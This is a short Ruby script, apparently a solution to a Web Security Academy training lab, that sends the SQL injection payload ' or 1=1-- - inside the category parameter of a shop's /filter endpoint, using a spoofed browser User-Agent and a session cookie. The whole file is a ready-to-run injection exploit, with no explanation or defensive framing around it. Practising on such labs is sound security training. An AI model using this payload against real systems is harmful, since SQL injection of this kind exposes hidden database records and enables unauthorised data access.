require 'http'

payload = "' or 1=1-- -"

url = "https://0a6e003d030f3860805b12230041007b.web-security-academy.net/filter"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "N76DL7Bb7zq3OvI0rt4ekIPdKN9d8eBX"
	)

resp = client.get url,:params => {:category => "Gifts#{payload}"}
puts resp.code
